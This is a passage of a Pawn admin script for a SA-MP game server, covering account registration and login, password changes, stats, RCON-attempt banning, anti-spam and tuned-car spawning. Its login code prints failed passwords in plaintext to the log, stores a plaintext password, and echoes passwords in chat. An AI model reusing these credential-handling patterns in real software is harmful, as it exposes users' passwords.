		new string[128], SkinID = strval(params);
		if((SkinID == 0)||(SkinID == 7)||(SkinID >= 9 && SkinID <= 41)||(SkinID >= 43 && SkinID <= 64)||(SkinID >= 66 && SkinID <= 73)||(SkinID >= 75 && SkinID <= 85)||(SkinID >= 87 && SkinID <= 118)||(SkinID >= 120 && SkinID <= 148)||(SkinID >= 150 && SkinID <= 207)||(SkinID >= 209 && SkinID <= 264)||(SkinID >= 274 && SkinID <= 288)||(SkinID >= 290 && SkinID <= 299))
		{
 			dUserSetINT(PlayerName2(playerid)).("FavSkin",SkinID);
		 	format(string, sizeof(string), "You have successfully saved this skin (ID %d)",SkinID);
		 	SendClientMessage(playerid,yellow,string);
			SendClientMessage(playerid,yellow,"Type: /useskin to use this skin when you spawn or /dontuseskin to stop using skin");
			dUserSetINT(PlayerName2(playerid)).("UseSkin",1);
		 	return CMDMessageToAdmins(playerid,"SAVESKIN");
		} else return SendClientMessage(playerid, green, "ERROR: Invalid Skin ID");
	} else return SendClientMessage(playerid,red,"ERROR: You must be an administrator to use this command");
}

CMD:useskin(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 1 && PlayerInfo[playerid][LoggedIn] == 1) {
	    dUserSetINT(PlayerName2(playerid)).("UseSkin",1);
    	SetPlayerSkin(playerid,dUserINT(PlayerName2(playerid)).("FavSkin"));
		return SendClientMessage(playerid,yellow,"Skin now in use");
	} else return SendClientMessage(playerid,red,"ERROR: You must be an administrator to use this command");
}

CMD:dontuseskin(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][Level] >= 1 && PlayerInfo[playerid][LoggedIn] == 1) {
	    dUserSetINT(PlayerName2(playerid)).("UseSkin",0);
		return SendClientMessage(playerid,yellow,"Skin will no longer be used");
	} else return SendClientMessage(playerid,red,"ERROR: You must be an administrator to use this command");
}

//====================== [REGISTER  &  LOGIN] ==================================
#if defined USE_AREGISTER

CMD:aregister(playerid,params[])
{
    if (PlayerInfo[playerid][LoggedIn] == 1) return SendClientMessage(playerid,red,"ACCOUNT: You are already registered and logged in.");
    if (udb_Exists(PlayerName2(playerid))) return SendClientMessage(playerid,red,"ACCOUNT: This account already exists, please use '/alogin [password]'.");
    if (strlen(params) == 0) return SendClientMessage(playerid,red,"ACCOUNT: Correct USAGE: '/aregister [password]'");
    if (strlen(params) < 4 || strlen(params) > 20) return SendClientMessage(playerid,red,"ACCOUNT: Password length must be greater than three characters");
    if (udb_Create(PlayerName2(playerid),params))
	{
    	new file[256],name[MAX_PLAYER_NAME], tmp3[100];
    	new strdate[20], year,month,day;	getdate(year, month, day);
		GetPlayerName(playerid,name,sizeof(name)); format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(name));
     	GetPlayerIp(playerid,tmp3,100);	dini_Set(file,"ip",tmp3);
//    	dini_Set(file,"password",params);
	    dUserSetINT(PlayerName2(playerid)).("registered",1);
   		format(strdate, sizeof(strdate), "%d/%d/%d",day,month,year);
		dini_Set(file,"RegisteredDate",strdate);
		dUserSetINT(PlayerName2(playerid)).("loggedin",1);
		dUserSetINT(PlayerName2(playerid)).("banned",0);
		dUserSetINT(PlayerName2(playerid)).("level",0);
	    dUserSetINT(PlayerName2(playerid)).("LastOn",0);
    	dUserSetINT(PlayerName2(playerid)).("money",0);
    	dUserSetINT(PlayerName2(playerid)).("kills",0);
	   	dUserSetINT(PlayerName2(playerid)).("deaths",0);
	    PlayerInfo[playerid][LoggedIn] = 1;
	    PlayerInfo[playerid][Registered] = 1;
	    SendClientMessage(playerid, green, "ACCOUNT: You are now registered, and have been automaticaly logged in");
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		return 1;
	}
    return 1;
}

CMD:alogin(playerid,params[])
{
    if (PlayerInfo[playerid][LoggedIn] == 1) return SendClientMessage(playerid,red,"ACCOUNT: You are already logged in.");
    if (!udb_Exists(PlayerName2(playerid))) return SendClientMessage(playerid,red,"ACCOUNT: Account doesn't exist, please use '/aregister [password]'.");
    if (strlen(params)==0) return SendClientMessage(playerid,red,"ACCOUNT: Correct USAGE: '/alogin [password]'");
    if (udb_CheckLogin(PlayerName2(playerid),params))
	{
	   	new file[256], tmp3[100], string[128];
	   	format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(PlayerName2(playerid)) );
   		GetPlayerIp(playerid,tmp3,100);
	   	dini_Set(file,"ip",tmp3);
		LoginPlayer(playerid);
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		if(PlayerInfo[playerid][Level] > 0) {
			format(string,sizeof(string),"ACCOUNT: Successfully Logged In. (Level %d)", PlayerInfo[playerid][Level] );
			return SendClientMessage(playerid,green,string);
       	} else return SendClientMessage(playerid,green,"ACCOUNT: Successfully Logged In");
	}
	else {
		PlayerInfo[playerid][FailLogin]++;
		printf("LOGIN: %s has failed to login, Wrong password (%s) Attempt (%d)", PlayerName2(playerid), params, PlayerInfo[playerid][FailLogin] );
		if(PlayerInfo[playerid][FailLogin] == MAX_FAIL_LOGINS)
		{
			new string[128]; format(string, sizeof(string), "%s has been kicked (Failed Logins)", PlayerName2(playerid) );
			SendClientMessageToAll(grey, string); print(string);
			Kick(playerid);
		}
		return SendClientMessage(playerid,red,"ACCOUNT: Login failed! Incorrect Password");
	}
}

CMD:achangepass(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1)	{
		if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /achangepass [new password]");
		if(strlen(params) < 4) return SendClientMessage(playerid,red,"ACCOUNT: Incorrect password length");
		new string[128];
		dUserSetINT(PlayerName2(playerid)).("password_hash",udb_hash(params) );
		dUserSet(PlayerName2(playerid)).("Password",params);
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
        format(string, sizeof(string),"ACCOUNT: You have successfully changed your password to [ %s ]",params);
		return SendClientMessage(playerid,yellow,string);
	} else return SendClientMessage(playerid,red, "ERROR: You must have an account to use this command");
}

CMD:asetpass(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 3) {
	    new string[128], tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2)) return SendClientMessage(playerid, red, "USAGE: /asetpass [playername] [new password]");
		if(strlen(tmp2) < 4 || strlen(tmp2) > MAX_PLAYER_NAME) return SendClientMessage(playerid,red,"ERROR: Incorrect password length");
		if(udb_Exists(tmp)) {
			dUserSetINT(tmp).("password_hash", udb_hash(tmp2));
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
    	    format(string, sizeof(string),"ACCOUNT: You have successfully set \"%s's\" account password to \"%s\"", tmp, tmp2);
			return SendClientMessage(playerid,yellow,string);
		} else return SendClientMessage(playerid,red, "ERROR: This player doesnt have an account");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}
#if defined USE_STATS
CMD:aresetstats(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][LoggedIn] == 1)	{
		// save as backup
	   	dUserSetINT(PlayerName2(playerid)).("oldkills",PlayerInfo[playerid][Kills]);
	   	dUserSetINT(PlayerName2(playerid)).("olddeaths",PlayerInfo[playerid][Deaths]);
		// stats reset
		PlayerInfo[playerid][Kills] = 0;
		PlayerInfo[playerid][Deaths] = 0;
		dUserSetINT(PlayerName2(playerid)).("kills",PlayerInfo[playerid][Kills]);
	   	dUserSetINT(PlayerName2(playerid)).("deaths",PlayerInfo[playerid][Deaths]);
        PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		return SendClientMessage(playerid,yellow,"ACCOUNT: You have successfully reset your stats. Your kills and deaths are: 0");
	} else return SendClientMessage(playerid,red, "ERROR: You must have an account to use this command");
}

CMD:astats(playerid,params[]) {
	new string[128], pDeaths, player1, h, m, s;
	if(isnull(params)) player1 = playerid;
	else player1 = strval(params);
	if(IsPlayerConnected(player1)) {
	    new Float:x, Float:y, Float:z, Float:health, Float:armor;
			 GetPlayerPos(playerid, x,y,z); GetPlayerHealth(playerid, health);
     GetPlayerArmour(playerid, armor);
	    TotalGameTime(player1, h, m, s);
	    PlayerPlaySound(playerid, 1137, 0.0, 0.0, 0.0);
 		if(PlayerInfo[player1][Deaths] == 0) pDeaths = 1; else pDeaths = PlayerInfo[player1][Deaths];
 		format(string, sizeof(string), "| %s's Stats:  Kills: %d | Deaths: %d | Ratio: %0.2f | Money: $%d | Time: %d hrs %d mins %d secs |Score: %d | Health:%d | Armour:%d",PlayerName2(player1), PlayerInfo[player1][Kills], PlayerInfo[player1][Deaths], Float:PlayerInfo[player1][Kills]/Float:pDeaths,GetPlayerMoney(player1), h, m, s, GetPlayerScore(playerid), floatround(health),armor);
		return SendClientMessage(playerid, green, string);
	} else return SendClientMessage(playerid, red, "Player Not Connected!");
}
#endif

#else


#if defined USE_STATS
CMD:stats(playerid,params[]) {
	new string[100], pDeaths, player1, h, m, s,playername[MAX_PLAYER_NAME];
	if(isnull(params)) player1 = playerid;
	else player1 = strval(params);

	if(IsPlayerConnected(player1)) {
	    TotalGameTime(player1, h, m, s);
	    GetPlayerName(player1, playername, sizeof(playername));
 		if(PlayerInfo[player1][Deaths] == 0) pDeaths = 1; else pDeaths = PlayerInfo[player1][Deaths];
 		new str[120], str1[100], str2[100];
 		format(str, sizeof(str),"| ------ | %s's Status | ------- |", PlayerName2(player1));
		format(string,sizeof(string),"Scores: %d | Money: $%d | Kills: %d | Deaths: %d | K/D Ratio: %0.2f", GetPlayerScore(player1), GetPlayerMoney(player1), PlayerInfo[player1][Kills], PlayerInfo[player1][Deaths], Float:PlayerInfo[player1][Kills]/Float:pDeaths);
		format(str1, sizeof(str1),"Admin Level: %d | Moderator: %s | Rank: %s | Team: %s | Class: %s", PlayerInfo[player1][Level], PlayerInfo[player1][Helper] ? ("Yes") : ("No"), GetRankName(player1), GetTeamName(player1), GetClass(player1));
		format(str2, sizeof(str2),"TimePlayed: [%d] hrs [%d] mins [%d] secs", h, m, s);
		SendClientMessage(playerid, 0xFFFFFFFF,str);
		SendClientMessage(playerid, 0xAAAAAAFF,string);
		SendClientMessage(playerid, 0xAAAAAAFF,str1);
		SendClientMessage(playerid, 0xAAAAAAFF,str2);
		SendClientMessage(playerid, 0xFFFFFFFF,"| ---------------------------------------------------- |");
	} else return SendClientMessage(playerid, red, "Player Not Connected!");
	return 1;
}
#endif
CMD:register(playerid,params[])
{
    if (PlayerInfo[playerid][LoggedIn] == 1) return SendClientMessage(playerid,red,"ACCOUNT: You are already registered and logged in.");
    if (udb_Exists(PlayerName2(playerid))) return SendClientMessage(playerid,red,"ACCOUNT: This account already exists, please use '/login [password]'.");
    if (strlen(params) == 0) return SendClientMessage(playerid,red,"ACCOUNT: Correct USAGE: '/register [password]'");
    if (strlen(params) < 4 || strlen(params) > 20) return SendClientMessage(playerid,red,"ACCOUNT: Password length must be greater than three characters");
    if (udb_Create(PlayerName2(playerid),params))
	{
    	new file[256],name[MAX_PLAYER_NAME], tmp3[100];
    	new strdate[20], year,month,day;	getdate(year, month, day);
		GetPlayerName(playerid,name,sizeof(name)); format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(name));
     	GetPlayerIp(playerid,tmp3,100);	dini_Set(file,"ip",tmp3);
//    	dini_Set(file,"password",params);
	    dUserSetINT(PlayerName2(playerid)).("registered",1);
   		format(strdate, sizeof(strdate), "%d/%d/%d",day,month,year);
		dini_Set(file,"RegisteredDate",strdate);
		dUserSetINT(PlayerName2(playerid)).("loggedin",1);
		dUserSetINT(PlayerName2(playerid)).("banned",0);
		dUserSetINT(PlayerName2(playerid)).("level",0);
	    dUserSetINT(PlayerName2(playerid)).("LastOn",0);
    	dUserSetINT(PlayerName2(playerid)).("money",0);
    	dUserSetINT(PlayerName2(playerid)).("Score",0);
    	dUserSetINT(PlayerName2(playerid)).("kills",0);
	   	dUserSetINT(PlayerName2(playerid)).("deaths",0);
	   	dUserSetINT(PlayerName2(playerid)).("hours",0);
	   	dUserSetINT(PlayerName2(playerid)).("minutes",0);
	   	dUserSetINT(PlayerName2(playerid)).("seconds",0);
	   	dUserSetINT(PlayerName2(playerid)).("drank",0);
	    PlayerInfo[playerid][LoggedIn] = 1;
	    PlayerInfo[playerid][Registered] = 1;
	    SendClientMessage(playerid, green, "ACCOUNT: You are now registered, and have been automaticaly logged in");
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		return 1;
	}
    return 1;
}

CMD:login(playerid,params[])
{
    if (PlayerInfo[playerid][LoggedIn] == 1) return SendClientMessage(playerid,red,"ACCOUNT: You are already logged in.");
    if (!udb_Exists(PlayerName2(playerid))) return SendClientMessage(playerid,red,"ACCOUNT: Account doesn't exist, please use '/register [password]'.");
    if (strlen(params)==0) return SendClientMessage(playerid,red,"ACCOUNT: Correct USAGE: '/login [password]'");
    if (udb_CheckLogin(PlayerName2(playerid),params))
	{
		new file[256], tmp3[100], string[128];
	   	format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(PlayerName2(playerid)) );
   		GetPlayerIp(playerid,tmp3,100);
	   	dini_Set(file,"ip",tmp3);
		LoginPlayer(playerid);
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		if(PlayerInfo[playerid][Level] > 0) {
			format(string,sizeof(string),"ACCOUNT: Successfully Logged In. (Level %d)", PlayerInfo[playerid][Level] );
			return SendClientMessage(playerid,green,string);
       	} else return SendClientMessage(playerid,green,"ACCOUNT: Successfully Logged In");
	}
	else {
		PlayerInfo[playerid][FailLogin]++;
		printf("LOGIN: %s has failed to login, Wrong password (%s) Attempt (%d)", PlayerName2(playerid), params, PlayerInfo[playerid][FailLogin] );
		if(PlayerInfo[playerid][FailLogin] == MAX_FAIL_LOGINS)
		{
			new string[128]; format(string, sizeof(string), "%s has been kicked (Failed Logins)", PlayerName2(playerid) );
			SendClientMessageToAll(grey, string);
			print(string);
			Kick(playerid);
		}
		return SendClientMessage(playerid,red,"ACCOUNT: Login failed! Incorrect Password");
	}
}

CMD:changepass(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1)	{
		if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /changepass [new password]");
		if(strlen(params) < 4) return SendClientMessage(playerid,red,"ACCOUNT: Incorrect password length");
		new string[128];
		dUserSetINT(PlayerName2(playerid)).("password_hash",udb_hash(params) );
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
        format(string, sizeof(string),"ACCOUNT: You have successfully changed your password to \"%s\"",params);
		return SendClientMessage(playerid,yellow,string);
	} else return SendClientMessage(playerid,red, "ERROR: You must have an account to use this command");
}

CMD:setname(playerid, params[])
{
        if(PlayerInfo[playerid][Level] >= 4)	{
        new string[128], tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		if(isnull(tmp) || isnull(tmp2)) return SendClientMessage(playerid, red, "USAGE: /setname [playerid] [new name]");
		if (udb_Exists(tmp2)) return SendClientMessage(playerid,red,"This User Name Is Taken!");
		new player1 = strval(tmp);
		if(PlayerInfo[player1][LoggedIn] == 0) return SendClientMessage(playerid,red,"Player Must Have Account!");
		new OldName[24],str[128];
		GetPlayerName(player1,OldName,sizeof(OldName));
		format(str,sizeof(str),"ladmin/users/%s.sav",OldName);
		udb_RenameUser(OldName,tmp2);
		format(str,sizeof(str),"ladmin/users/%s.sav",params);
		SetPlayerName(player1,tmp2);
		PlayerPlaySound(player1,1057,0.0,0.0,0.0);
        format(string, sizeof(string),"Admin ''%s'' Has Changed Your Name To '%s'",PlayerName2(playerid), tmp2);
		return SendClientMessage(player1,yellow,string);
	}   else return SendClientMessage(playerid,red, "ERROR: Only Level +4 can Use This Command");
}
CMD:changename(playerid, params[])
{
        if(PlayerInfo[playerid][LoggedIn] == 1)	{
		if(isnull(params)) return SendClientMessage(playerid, red, "USAGE: /changename [new Name]");
		if(strlen(params) < 4) return SendClientMessage(playerid,red,"ACCOUNT: Incorrect password length");
		if (udb_Exists(params)) return SendClientMessage(playerid,red,"This User Name Is Taken!");
		if(GetPlayerMoney(playerid) < 50000) return SendClientMessage(playerid, red,"You need to have $50000 to change name");
		new nameee[24];  GetPlayerName(playerid, nameee, 16);
		new OldName[24],str[128];
		GetPlayerName(playerid,OldName,sizeof(OldName));
		format(str,sizeof(str),"ladmin/users/%s.sav",OldName);
		udb_RenameUser(OldName,params);
		format(str,sizeof(str),"ladmin/users/%s.sav",params);
		SetPlayerName(playerid,params);
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		new string[128];
		GivePlayerMoney(playerid, -50000);
        format(string, sizeof(string),"ACCOUNT: You have successfully changed your Name to \"%s\"",params);
		return SendClientMessage(playerid,yellow,string);
	} else return SendClientMessage(playerid,red, "ERROR: You must have an account to use this command");
}
CMD:setpass(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 3) {
	    new string[128], tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(tmp) || isnull(tmp2)) return SendClientMessage(playerid, red, "USAGE: /setpass [playername] [new password]");
		if(strlen(tmp2) < 4 || strlen(tmp2) > MAX_PLAYER_NAME) return SendClientMessage(playerid,red,"ERROR: Incorrect password length");
		if(udb_Exists(tmp)) {
			dUserSetINT(tmp).("password_hash", udb_hash(tmp2));
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
    	    format(string, sizeof(string),"ACCOUNT: You have successfully set \"%s's\" account password to \"%s\"", tmp, tmp2);
			return SendClientMessage(playerid,yellow,string);
		} else return SendClientMessage(playerid,red, "ERROR: This player doesnt have an account");
	} else return SendClientMessage(playerid,red,"ERROR: You are not a high enough level to use this command");
}


#if defined USE_STATS
CMD:resetstats(playerid,params[]) {
    #pragma unused params
	if(PlayerInfo[playerid][LoggedIn] == 1)	{
		// save as backup
	   	dUserSetINT(PlayerName2(playerid)).("oldkills",PlayerInfo[playerid][Kills]);
	   	dUserSetINT(PlayerName2(playerid)).("olddeaths",PlayerInfo[playerid][Deaths]);
		// stats reset
		PlayerInfo[playerid][Kills] = 0;
		PlayerInfo[playerid][Deaths] = 0;
		dUserSetINT(PlayerName2(playerid)).("kills",PlayerInfo[playerid][Kills]);
	   	dUserSetINT(PlayerName2(playerid)).("deaths",PlayerInfo[playerid][Deaths]);
        PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		return SendClientMessage(playerid,yellow,"ACCOUNT: You have successfully reset your stats. Your kills and deaths are: 0");
	} else return SendClientMessage(playerid,red, "ERROR: You must have an account to use this command");
}
#endif


#endif

stock LoginPlayer(playerid)
{
	dUserSetINT(PlayerName2(playerid)).("loggedin",1);
	PlayerInfo[playerid][Deaths] = (dUserINT(PlayerName2(playerid)).("deaths"));
	PlayerInfo[playerid][Kills] = (dUserINT(PlayerName2(playerid)).("kills"));
 	PlayerInfo[playerid][Level] = (dUserINT(PlayerName2(playerid)).("level"));
   	PlayerInfo[playerid][hours] = dUserINT(PlayerName2(playerid)).("hours");
   	PlayerInfo[playerid][mins] = dUserINT(PlayerName2(playerid)).("minutes");
   	PlayerInfo[playerid][secs] = dUserINT(PlayerName2(playerid)).("seconds");
   	SetPlayerScore(playerid,dUserINT(PlayerName2(playerid)).("Score"));
   	SetPlayerMoney(playerid,dUserINT(PlayerName2(playerid)).("money"));
   	PlayerInfo[playerid][Helper] = (dUserINT(PlayerName2(playerid)).("Help moderator"));
   	PlayerInfo[playerid][dRank] = (dUserINT(PlayerName2(playerid)).("Donor"));
	PlayerInfo[playerid][Registered] = 1;
 	PlayerInfo[playerid][LoggedIn] = 1;
 	return 1;
}

//==============================================================================
public OnRconLoginAttempt(ip[], password[], success)
{
    if(!success)
    {
        new playersIP[17], playerid;

        for(; playerid < MAX_PLAYERS; playerid++)
        {
            GetPlayerIp(playerid, playersIP, 17);
            if(!strcmp(ip, playersIP))
            {
                break;
            }
        }

        rconAttempts[playerid]++;

        if(rconAttempts[playerid] >= 3)
        {
            Ban(playerid);
        }
    }
    return 1;
}
//==============================================================================
public OnPlayerCommandReceived(playerid, cmdtext[])
{
    if(PlayerInfo[playerid][Jailed] == 1 && PlayerInfo[playerid][Level] < 1) return
	    SendClientMessage(playerid,red,"You cannot use commands in jail");
	if(PlayerInfo[playerid][Level] < 1)
	{
	    new TCount, KMessage[128];

		TCount = GetPVarInt(playerid, "CommandSpamCount");

		TCount++;

		SetPVarInt(playerid, "CommandSpamCount", TCount);
		if(TCount == 3)
		{
			GetPlayerName(playerid, KMessage, sizeof(KMessage));
			format(KMessage, sizeof(KMessage), "[Anti-Spam]: %s has been kicked for command spamming.", KMessage);
			SendClientMessageToAll(0xFFFFFFFF, KMessage);
			print(KMessage);
			Kick(playerid);
		}

		SetTimerEx("ResetCommandCount", SpamLimit, false, "i", playerid);
    }

	new cmd[256], string[128], tmp[256], idx;
	cmd = strtok(cmdtext, idx);
	if(ServerInfo[ReadCmds] == 1)
	{
		format(string, sizeof(string), "*** %s (%d) typed: %s", pName(playerid),playerid,cmdtext);
		for(new i = 0; i < MAX_PLAYERS; i++) {
			if(IsPlayerConnected(i)) {
				if( (PlayerInfo[i][Level] > PlayerInfo[playerid][Level]) && (PlayerInfo[i][Level] > 6) && (i != playerid) ) {
					SendClientMessage(i, grey, string);
				}
			}
		}
	}


//========================= [ Car Commands ]====================================

	if(strcmp(cmdtext, "/ltunedcar2", true)==0 || strcmp(cmdtext, "/ltc2", true)==0)	{
	if(PlayerInfo[playerid][Level] >= 1) {
		if(IsPlayerInAnyVehicle(playerid)) {
		SendClientMessage(playerid,red,"Error: You already have a vehicle");
		} else  {
		if(PlayerInfo[playerid][pCar] != -1) CarDeleter(PlayerInfo[playerid][pCar]);
		new Float:X,Float:Y,Float:Z,Float:Angle,LVehicleIDt;	GetPlayerPos(playerid,X,Y,Z); GetPlayerFacingAngle(playerid,Angle);
        LVehicleIDt = CreateVehicle(560,X,Y,Z,Angle,1,-1,-1);	PutPlayerInVehicle(playerid,LVehicleIDt,0); CMDMessageToAdmins(playerid,"LTunedCar");	    AddVehicleComponent(LVehicleIDt, 1028);	AddVehicleComponent(LVehicleIDt, 1030);	AddVehicleComponent(LVehicleIDt, 1031);	AddVehicleComponent(LVehicleIDt, 1138);	AddVehicleComponent(LVehicleIDt, 1140);  AddVehicleComponent(LVehicleIDt, 1170);
	    AddVehicleComponent(LVehicleIDt, 1028);	AddVehicleComponent(LVehicleIDt, 1030);	AddVehicleComponent(LVehicleIDt, 1031);	AddVehicleComponent(LVehicleIDt, 1138);	AddVehicleComponent(LVehicleIDt, 1140);  AddVehicleComponent(LVehicleIDt, 1170);
	    AddVehicleComponent(LVehicleIDt, 1080);	AddVehicleComponent(LVehicleIDt, 1086); AddVehicleComponent(LVehicleIDt, 1087); AddVehicleComponent(LVehicleIDt, 1010);	PlayerPlaySound(playerid,1133,0.0,0.0,0.0);	ChangeVehiclePaintjob(LVehicleIDt,1);
	   	SetVehicleVirtualWorld(LVehicleIDt, GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(LVehicleIDt, GetPlayerInterior(playerid));
		PlayerInfo[playerid][pCar] = LVehicleIDt;
		}
	} else SendClientMessage(playerid,red,"ERROR: You need to be level 1 to use this command");
	return 1;	}
//------------------------------------------------------------------------------
	if(strcmp(cmdtext, "/ltunedcar3", true)==0 || strcmp(cmdtext, "/ltc3", true)==0)	{
	if(PlayerInfo[playerid][Level] >= 1) {
		if(IsPlayerInAnyVehicle(playerid)) {
		SendClientMessage(playerid,red,"Error: You already have a vehicle");
		} else  {
		if(PlayerInfo[playerid][pCar] != -1) CarDeleter(PlayerInfo[playerid][pCar]);
		new Float:X,Float:Y,Float:Z,Float:Angle,LVehicleIDt;	GetPlayerPos(playerid,X,Y,Z); GetPlayerFacingAngle(playerid,Angle);
        LVehicleIDt = CreateVehicle(560,X,Y,Z,Angle,1,-1,-1);	PutPlayerInVehicle(playerid,LVehicleIDt,0); CMDMessageToAdmins(playerid,"LTunedCar");	    AddVehicleComponent(LVehicleIDt, 1028);	AddVehicleComponent(LVehicleIDt, 1030);	AddVehicleComponent(LVehicleIDt, 1031);	AddVehicleComponent(LVehicleIDt, 1138);	AddVehicleComponent(LVehicleIDt, 1140);  AddVehicleComponent(LVehicleIDt, 1170);
	    AddVehicleComponent(LVehicleIDt, 1080);	AddVehicleComponent(LVehicleIDt, 1086); AddVehicleComponent(LVehicleIDt, 1087); AddVehicleComponent(LVehicleIDt, 1010);	PlayerPlaySound(playerid,1133,0.0,0.0,0.0);	ChangeVehiclePaintjob(LVehicleIDt,2);
	   	SetVehicleVirtualWorld(LVehicleIDt, GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(LVehicleIDt, GetPlayerInterior(playerid));
		PlayerInfo[playerid][pCar] = LVehicleIDt;
		}
	} else SendClientMessage(playerid,red,"ERROR: You need to be level 1 to use this command");
	return 1;	}
//------------------------------------------------------------------------------
	if(strcmp(cmdtext, "/ltunedcar4", true)==0 || strcmp(cmdtext, "/ltc4", true)==0)	{
	if(PlayerInfo[playerid][Level] >= 1) {
		if(IsPlayerInAnyVehicle(playerid)) {
		SendClientMessage(playerid,red,"Error: You already have a vehicle");
		} else  {
		if(PlayerInfo[playerid][pCar] != -1) CarDeleter(PlayerInfo[playerid][pCar]);
		new Float:X,Float:Y,Float:Z,Float:Angle,carid;	GetPlayerPos(playerid,X,Y,Z); GetPlayerFacingAngle(playerid,Angle);
        carid = CreateVehicle(559,X,Y,Z,Angle,1,-1,-1);	PutPlayerInVehicle(playerid,carid,0); CMDMessageToAdmins(playerid,"LTunedCar");
    	AddVehicleComponent(carid,1065);    AddVehicleComponent(carid,1067);    AddVehicleComponent(carid,1162); AddVehicleComponent(carid,1010); AddVehicleComponent(carid,1073);	ChangeVehiclePaintjob(carid,1);
	   	SetVehicleVirtualWorld(carid, GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(carid, GetPlayerInterior(playerid));
		PlayerInfo[playerid][pCar] = carid;
		}
	} else SendClientMessage(playerid,red,"ERROR: You need to be level 1 to use this command");
	return 1;	}
//------------------------------------------------------------------------------
	if(strcmp(cmdtext, "/ltunedcar5", true)==0 || strcmp(cmdtext, "/ltc5", true)==0)	{
	if(PlayerInfo[playerid][Level] >= 1) {
		if(IsPlayerInAnyVehicle(playerid)) {
		SendClientMessage(playerid,red,"Error: You already have a vehicle");
		} else  {
		if(PlayerInfo[playerid][pCar] != -1) CarDeleter(PlayerInfo[playerid][pCar]);
		new Float:X,Float:Y,Float:Z,Float:Angle,carid;	GetPlayerPos(playerid,X,Y,Z); GetPlayerFacingAngle(playerid,Angle);
        carid = CreateVehicle(565,X,Y,Z,Angle,1,-1,-1);	PutPlayerInVehicle(playerid,carid,0); CMDMessageToAdmins(playerid,"LTunedCar");
	    AddVehicleComponent(carid,1046); AddVehicleComponent(carid,1049); AddVehicleComponent(carid,1053); AddVehicleComponent(carid,1010); AddVehicleComponent(carid,1073); ChangeVehiclePaintjob(carid,1);
	   	SetVehicleVirtualWorld(carid, GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(carid, GetPlayerInterior(playerid));
		PlayerInfo[playerid][pCar] = carid;
		}
	} else SendClientMessage(playerid,red,"ERROR: You need to be level 1 to use this command");
	return 1;	}
//------------------------------------------------------------------------------
	if(strcmp(cmdtext, "/ltunedcar6", true)==0 || strcmp(cmdtext, "/ltc6", true)==0)	{
	if(PlayerInfo[playerid][Level] >= 1) {
		if(IsPlayerInAnyVehicle(playerid)) {
		SendClientMessage(playerid,red,"Error: You already have a vehicle");
		} else  {
		if(PlayerInfo[playerid][pCar] != -1) CarDeleter(PlayerInfo[playerid][pCar]);
		new Float:X,Float:Y,Float:Z,Float:Angle,carid;	GetPlayerPos(playerid,X,Y,Z); GetPlayerFacingAngle(playerid,Angle);
        carid = CreateVehicle(558,X,Y,Z,Angle,1,-1,-1);	PutPlayerInVehicle(playerid,carid,0); CMDMessageToAdmins(playerid,"LTunedCar");
    	AddVehicleComponent(carid,1088); AddVehicleComponent(carid,1092); AddVehicleComponent(carid,1139); AddVehicleComponent(carid,1010); AddVehicleComponent(carid,1073); ChangeVehiclePaintjob(carid,1);
 	   	SetVehicleVirtualWorld(carid, GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(carid, GetPlayerInterior(playerid));
		PlayerInfo[playerid][pCar] = carid;
		}
	} else SendClientMessage(playerid,red,"ERROR: You need to be level 1 to use this command");
	return 1;	}
//------------------------------------------------------------------------------
	if(strcmp(cmdtext, "/ltunedcar7", true)==0 || strcmp(cmdtext, "/ltc7", true)==0)	{
	if(PlayerInfo[playerid][Level] >= 1) {
		if(IsPlayerInAnyVehicle(playerid)) {
		SendClientMessage(playerid,red,"Error: You already have a vehicle");
		} else  {
		if(PlayerInfo[playerid][pCar] != -1) CarDeleter(PlayerInfo[playerid][pCar]);
		new Float:X,Float:Y,Float:Z,Float:Angle,carid;	GetPlayerPos(playerid,X,Y,Z); GetPlayerFacingAngle(playerid,Angle);
        carid = CreateVehicle(561,X,Y,Z,Angle,1,-1,-1);	PutPlayerInVehicle(playerid,carid,0); CMDMessageToAdmins(playerid,"LTunedCar");
    	AddVehicleComponent(carid,1055); AddVehicleComponent(carid,1058); AddVehicleComponent(carid,1064); AddVehicleComponent(carid,1010); AddVehicleComponent(carid,1073); ChangeVehiclePaintjob(carid,1);
	   	SetVehicleVirtualWorld(carid, GetPlayerVirtualWorld(playerid)); LinkVehicleToInterior(carid, GetPlayerInterior(playerid));
		PlayerInfo[playerid][pCar] = carid;
		}
	} else SendClientMessage(playerid,red,"ERROR: You need to be level 1 to use this command");
	return 1;	}
//------------------------------------------------------------------------------
	if(strcmp(cmdtext, "/ltunedcar8", true)==0 || strcmp(cmdtext, "/ltc8", true)==0)	{
